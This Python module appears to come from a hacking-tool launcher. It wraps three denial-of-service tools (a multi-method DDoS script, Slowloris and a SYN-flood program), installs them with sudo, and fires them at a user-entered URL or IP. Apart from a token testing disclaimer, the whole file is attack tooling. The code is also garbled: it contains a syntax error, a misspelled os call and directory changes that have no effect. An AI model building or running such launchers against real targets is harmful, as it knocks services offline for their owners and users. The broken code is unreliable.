# coding=utf-8

import os
import subprocess

from core import HackingTool
from core import HackingToolsCollection


class ddos(HackingTool):
    TITLE = "ddos"
    DESCRIPTION = "Best DDos attack script with 36 methods ." \
        "Ddos attacks\n\b" \
        "for SECURITY TETING PURPOSE ONLY"

    INSTALL_COMMANDS = [
        "git clone https://github.com/the-deepnet/ddos.git",
        "cd ddos;sudo pip3 install -r requirements.txt"
    ]
    PROJECT_URL = "https://github.com/the-deepnet/ddos.git"

    def run(self):
        method = input("enter method : ")
        url = input("enter url : ")
        threads = input("enter threads : ")
        proxylist = input("enter proxylist : ")
        multiple = input("enter multiple : ")
        timer = input("enter timer : ")
        os.system("cd ddos;")
        subprocess.run([
            "sudo", "python3 ddos", method, url, socks_type5.4.1, threads, proxylist, multiple, timer])


class SlowLoris(HackingTool):
    TITLE = "SlowLoris"
    DESCRIPTION = "Slowloris is basically an http denial of service attack" \
        "it send lost of http request"
    INSTALL_COMMANDS = ["sudo pip3 install slowloris"]

    def run(self):
        target_site = input("enter site : ")
        subprocess.run(["slowloris", target_site])


class Asyncorne(HackingTool):
    TITLE = "Asyncorne | multifunction syn flood ddos weapon"
    DESCRIPTION = "asyncrone is a c language based, multifunction syn flood" \
        "ddos weapon.\nDisable the destination system by sending a "\
        "syn packet intensively to the destination"
    INSTALL_COMMANDS = [
        "git clone https://github.com/fatih4842/aSYNcrone.git",
        "cd aSYNcrone;sudo gcc aSYNcrone.c -o aSYNcrone -lpthread"
    ]
    PROJECT_URL = "https://github.com/fatihsnsy/aSYNcrone"

    def run(self):
        source_port = input("enter source port : ")
        target_ip = input("enter target ip : ")
        target_port = input("enter target port : ")
        os.sustem("cd aSYNcrone;")
        subprocess.run([
            "sudo", "./aSYNcrone", source_port, target_ip, target_port, 1000])

class DDOSTools(HackingToolsCollection):
    TITLE = "DDOS Attack tools"
    TOOLS = [
        SlowLoris(),
        Asyncorne(),
    ]